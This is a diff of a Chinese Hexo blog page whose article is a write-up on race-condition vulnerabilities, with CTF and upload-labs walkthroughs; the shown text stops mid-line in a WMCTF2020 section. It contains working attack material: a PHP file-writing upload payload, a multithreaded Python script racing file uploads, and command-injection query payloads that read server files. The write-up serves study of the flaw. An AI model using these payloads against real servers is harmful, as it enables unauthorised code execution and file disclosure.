@@ -1,59 +1,247 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/atkx_16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/atkx-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="0x00-条件竞争条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果，简而言之就是并没有考虑线程同步。因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。 0x01-基础知识先来了解一下关于条件竞争的基础知">
-<meta property="og:type" content="article">
-<meta property="og:title" content="浅析条件竞争漏洞">
-<meta property="og:url" content="https://swhat.github.io/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/index.html">
-<meta property="og:site_name" content="At的小站">
-<meta property="og:description" content="0x00-条件竞争条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果，简而言之就是并没有考虑线程同步。因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。 0x01-基础知识先来了解一下关于条件竞争的基础知">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210414203927555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210426193037110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210426193244134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210426193746282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021042619421151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210510193858557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021052021583531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021052022111369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210520220749657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021052013092414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210520130945799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210520131009940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210520131709942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210520223912589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210520224545601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021052022574475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210425193008262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210425193100247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70">
-<meta property="article:published_time" content="2021-05-23T14:05:15.000Z">
-<meta property="article:modified_time" content="2021-08-15T03:59:06.609Z">
-<meta property="article:author" content="Atkx">
-<meta property="article:tag" content="漏洞">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210414203927555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70"><title>浅析条件竞争漏洞 | At的小站</title><link ref="canonical" href="https://swhat.github.io/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
-var CONFIG = {
-  root: '/',
-  algolia: undefined,
-  assistSearch: undefined,
-  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
-  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
-  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
-  postWidget: {"endText":true},
-  nightMode: {"enable":true},
-  back2top: {"enable":true},
-  codeblock: {"style":"default","highlight":"light","wordWrap":false},
-  reward: false,
-  fancybox: false,
-  zoomImage: {"gapAside":"20px"},
-  galleryWaterfall: undefined,
-  lazyload: false,
-  pjax: undefined,
-  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
-  shortcuts: undefined,
-  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
-  sourcePath: {"js":"js","css":"css","images":"images"},
-};
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="At的小站" type="application/atom+xml">
-</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fas-folder-open"></i></span><span class="header-nav-menu-item__text">menu.links</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">At的小站</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">浅析条件竞争漏洞</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-05-23</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">3.5k</span></span></div></header><div class="post-body"> <a id="more"></a>
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/atkx_16x16.png">
+  <link rel="icon" href="/img/atkx_16x16.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Atkx">
+  <meta name="keywords" content="">
+  
+  <title>浅析条件竞争漏洞 - At的小站</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"atkx.gitee.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="At的小站" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Atkx</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg_image2.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="浅析条件竞争漏洞">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-05-23 22:05" pubdate>
+        2021年5月23日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      49
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">浅析条件竞争漏洞</h1>
+            
+            <div class="markdown-body">
+               <a id="more"></a>
 
 <h2 id="0x00-条件竞争"><a href="#0x00-条件竞争" class="headerlink" title="0x00-条件竞争"></a>0x00-条件竞争</h2><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果，简而言之就是并没有考虑线程同步。因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
 <h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01-基础知识"></a>0x01-基础知识</h2><p>先来了解一下关于条件竞争的基础知识</p>
@@ -79,11 +267,11 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"><lin
 <p>使用burpsuite抓包上传shell.php，一直重放上传文件</p>
 <p>shell.php内容：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;pass.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<p>只要访问了shell.php文件，php文件就会成功解析执行，自动创建一个pass.php，写入一句话木马：<code>&lt;?php phpinfo();?&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210414203927555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后Send to lntruder，并且进行以下的设置<br><img src="https://img-blog.csdnimg.cn/20210426193037110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Payload设置<br><img src="https://img-blog.csdnimg.cn/20210426193244134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>然后不停访问<code>http://localhost/upload-labs/upload/shell.php</code>，爆破结束后，访问pass.php，出现phpinfo信息，shell上传成功<img src="https://img-blog.csdnimg.cn/20210426193746282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>只要访问了shell.php文件，php文件就会成功解析执行，自动创建一个pass.php，写入一句话木马：<code>&lt;?php phpinfo();?&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210414203927555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>然后Send to lntruder，并且进行以下的设置<br><img src="https://img-blog.csdnimg.cn/20210426193037110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>Payload设置<br><img src="https://img-blog.csdnimg.cn/20210426193244134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>然后不停访问<code>http://localhost/upload-labs/upload/shell.php</code>，爆破结束后，访问pass.php，出现phpinfo信息，shell上传成功<img src="https://img-blog.csdnimg.cn/20210426193746282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p><strong>方法二</strong>：pytho多线程上传</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">td</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):</span><br>    url = <span class="hljs-string">&#x27;http://localhost/upload-labs/Pass-17/index.php&#x27;</span><br>    files = &#123;<span class="hljs-string">&#x27;upload_file&#x27;</span>: (<br>        <span class="hljs-string">&#x27;shell2.php&#x27;</span>, <span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;pass2.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>)&#125;<br>    data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;上传&#x27;</span>&#125;<br>    r = requests.post(url=url, data=data, files=files)<br>    re = requests.get(<span class="hljs-string">&#x27;http://localhost/upload-labs/upload/shell2.php&#x27;</span>)<br>    <span class="hljs-keyword">if</span> re.status_code == <span class="hljs-number">200</span>:<br>        print(<span class="hljs-string">&#x27;上传成功&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">20</span>) <span class="hljs-keyword">as</span> p:<br>        p.<span class="hljs-built_in">map</span>(td, <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>))<br></code></pre></td></tr></table></figure>
-<p>访问pass2.php，也能看到phpinfo页面<br><img src="https://img-blog.csdnimg.cn/2021042619421151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>访问pass2.php，也能看到phpinfo页面<br><img src="https://img-blog.csdnimg.cn/2021042619421151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <h3 id="ctfhsow-大牛杯-web-checkin"><a href="#ctfhsow-大牛杯-web-checkin" class="headerlink" title="ctfhsow [大牛杯]-web_checkin"></a>ctfhsow [大牛杯]-web_checkin</h3><p>看<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/116352564">羽师傅</a>的大牛杯wp，发现用到了条件竞争漏洞，照着wp复现一下。</p>
 <p>随便传参一个code=1,F12查看源码，注释提示仅允许index.php存在，删除所有其他文件，从这句话里可以猜测含有条件竞争漏洞。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- 仅允许index.php存在，删除所有其他文件 --&gt;<br>xi nei~<br></code></pre></td></tr></table></figure>
@@ -95,7 +283,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"><lin
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=`nl%09/*&gt;atkx`<br></code></pre></td></tr></table></figure>
 <p>直接使用羽师傅的脚本进行条件竞争，将源码写入atkx中</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment">#author: yu2xx</span><br>import requests<br>import threading<br>import sys<br>session=requests.session()<br>url1=<span class="hljs-string">&quot;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/&quot;</span><br>url2=<span class="hljs-string">&#x27;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/atkx&#x27;</span><br>def write():<br>	<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>		r = session.get(url1)<br>def read():<br>	<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>		r = session.get(url2)<br>		<span class="hljs-keyword">if</span> len(r.text)!=<span class="hljs-number">9561</span>: <span class="hljs-comment">#随便get传一次就能得到这个长度</span><br>    			<span class="hljs-keyword">print</span>(r.text)<br><br>threads = [threading.Thread(target=write),<br>       threading.Thread(target=read)]<br><span class="hljs-keyword">for</span> t in threads:<br>	t.start()<br></code></pre></td></tr></table></figure>
-<p>然后访问atkx可以读取到源码<br><img src="https://img-blog.csdnimg.cn/20210510193858557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>想要得到flag的话，直接</p>
+<p>然后访问atkx可以读取到源码<br><img src="https://img-blog.csdnimg.cn/20210510193858557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>想要得到flag的话，直接</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`nl%09/*<br></code></pre></td></tr></table></figure>
 <h3 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span 